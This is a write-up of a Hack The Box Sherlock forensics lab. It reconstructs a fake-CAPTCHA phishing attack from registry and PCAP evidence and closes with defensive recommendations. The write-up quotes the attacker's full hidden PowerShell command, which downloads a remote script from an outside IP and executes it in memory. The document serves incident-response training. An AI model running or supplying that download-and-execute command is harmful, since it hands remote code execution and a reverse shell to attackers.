
<div align="center">

# HTB Sherlock: Pikaptcha

![Category](https://img.shields.io/badge/Category-Network%20%26%20Windows%20Forensics-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Focus](https://img.shields.io/badge/Focus-Phishing%20%7C%20PowerShell%20%7C%20Reverse%20Shell-red)

**PCAP Analysis | Windows Registry Forensics | PowerShell Payload Analysis**

</div>

## Overview

Pikaptcha investigates a phishing incident targeting Forela employee Happy Grunwald. The victim received an email claiming that a Microsoft Office update was available, visited the linked website, and completed a CAPTCHA challenge. Instead of downloading Office, the victim was tricked into executing a malicious PowerShell command through the Windows Run dialog.

The investigation combines network traffic analysis and Windows endpoint artifacts to recover the initial execution command, identify the downloaded payload, calculate its hash, and reconstruct the attacker's reverse-shell connection.

## Tools & Artifacts

| Item | Details |
|---|---|
| Network evidence | PCAP file |
| Endpoint evidence | KAPE collection |
| Registry artifact | `C:\Users\happy.grunwald\NTUSER.dat` |
| Registry analysis | Registry Explorer |
| Prefetch analysis | PECmd |
| Network analysis | Wireshark |
| Additional analysis | PowerShell decoding, SHA-256 hashing |
| Attacker IP | `43.205.115.44` |
| Reverse-shell port | `6969` |

## Investigation

### 1. Recover the Initial Execution Command

The investigation began with the user's registry hive:

`C:\Users\happy.grunwald\NTUSER.dat`

The hive's transaction logs were replayed to recover the latest registry state. Registry Explorer's bookmarks helped identify the `RunMRU` key, which records commands entered through the Windows Run dialog.

A suspicious PowerShell command was found, matching the incident date.

**Recovered command:**

    powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"

The command downloads and executes a remote PowerShell script directly in memory. Its hidden window and execution-policy bypass parameters are consistent with an attempt to execute code while reducing visibility to the user.

### 2. Determine the Payload Execution Time

The registry evidence identified the timestamp associated with the malicious command.

**Execution timestamp (UTC):** `2024-09-23 05:07:45`

This timestamp established the starting point for correlating endpoint activity with network traffic.

### 3. Identify and Hash the Downloaded Script

Wireshark was used to investigate traffic associated with the attacker IP:

    ip.addr == 43.205.115.44

The HTTP traffic revealed the script downloaded by the initial PowerShell command. The file was recovered using Wireshark's **File → Export Objects → HTTP** functionality.

Inspection revealed an encoded PowerShell payload. After decoding, the script was identified as a PowerShell-based reverse shell capable of providing the attacker with interactive remote command execution.

**SHA-256:**

    579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE

### 4. Identify the Reverse-Shell Port

Analysis of the decoded PowerShell payload identified the destination port used for the reverse-shell connection.

**Destination port:** `6969`

The PCAP supported this finding: multiple TCP connections were observed between the victim and the attacker's IP on the same port.

This traffic pattern was consistent with the reverse-shell activity described in the decoded script.

### 5. Calculate the Connection Duration

The following Wireshark display filter isolated traffic associated with the reverse-shell port:

    ip.addr == 43.205.115.44 && tcp.port == 6969

The connection duration was calculated by comparing the start and end times of the relevant communication.

**Observed duration:** `403 seconds`

This represents approximately 6 minutes and 43 seconds of reverse-shell communication, based on the timestamps identified in the walkthrough.

### 6. Identify the Malicious CAPTCHA Function

The attacker-hosted CAPTCHA page was examined through its HTTP traffic, which exposed the page's source code.

The following filter isolated HTTP traffic involving the attacker's server:

    ip.addr == 43.205.115.44 && http

Inspection of the HTTP response revealed the JavaScript function responsible for placing the malicious command in the victim's clipboard.

**Function name:** `stageClipboard`

The CAPTCHA was therefore part of a social-engineering technique rather than a legitimate verification mechanism. The victim was manipulated into pasting the clipboard contents into the Windows Run dialog, triggering the initial PowerShell command.

## Attack Timeline

| Stage | Activity |
|---|---|
| 1 | Victim receives a phishing email advertising a Microsoft Office update |
| 2 | Victim visits the attacker's website and interacts with a malicious CAPTCHA |
| 3 | The `stageClipboard` function places the malicious command in the clipboard |
| 4 | Victim pastes the command into the Windows Run dialog |
| 5 | PowerShell downloads `office2024install.ps1` from `43.205.115.44` |
| 6 | The downloaded script executes in memory and establishes a reverse shell |
| 7 | Reverse-shell communication uses TCP port `6969` for 403 seconds |

## Key Findings

| Finding | Result |
|---|---|
| Victim | Happy Grunwald |
| Initial execution time (UTC) | `2024-09-23 05:07:45` |
| Initial delivery IP | `43.205.115.44` |
| Downloaded script | `office2024install.ps1` |
| Script SHA-256 | `579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE` |
| Reverse-shell port | `6969` |
| Reverse-shell duration | `403 seconds` |
| Malicious CAPTCHA function | `stageClipboard` |

## Defensive Recommendations

- **Strengthen phishing defenses:** Block suspicious update links and educate users to obtain software only from trusted vendor sources.
- **Detect clipboard-based social engineering:** Train users to recognize instructions that require pasting commands into Windows Run or PowerShell to complete a CAPTCHA or verification.
- **Monitor PowerShell execution:** Alert on hidden PowerShell processes, execution-policy bypasses, and `DownloadString`-based script retrieval.
- **Restrict outbound connections:** Monitor unusual outbound connections to untrusted IP addresses and uncommon TCP ports, including port `6969`.
- **Preserve endpoint evidence:** Collect registry hives and their transaction logs to support reliable reconstruction of command execution.
- **Correlate network and endpoint telemetry:** Use PCAPs, process creation logs, PowerShell logs, and registry artifacts to establish a consistent incident timeline.
- **Contain compromised endpoints:** Isolate affected machines, investigate potential follow-on activity, and remove any persistence mechanisms discovered during the response.

## Key Takeaways

- Windows Registry artifacts can preserve commands entered through the Run dialog.
- Registry transaction logs may contain relevant changes needed to reconstruct the latest hive state.
- PCAP analysis can recover HTTP-delivered scripts and reveal command-and-control behavior.
- Encoded PowerShell payloads should be decoded and inspected to determine their actual functionality.
- Malicious CAPTCHA pages can manipulate users into executing attacker-supplied commands through clipboard abuse.
- Combining endpoint forensics with network analysis provides stronger evidence than relying on either source independently.

## Skills Demonstrated

`Network Forensics` · `PCAP Analysis` · `Windows Registry Forensics` · `PowerShell Analysis` · `Payload Hashing` · `Reverse Shell Analysis` · `Phishing Investigation` · `Incident Response`
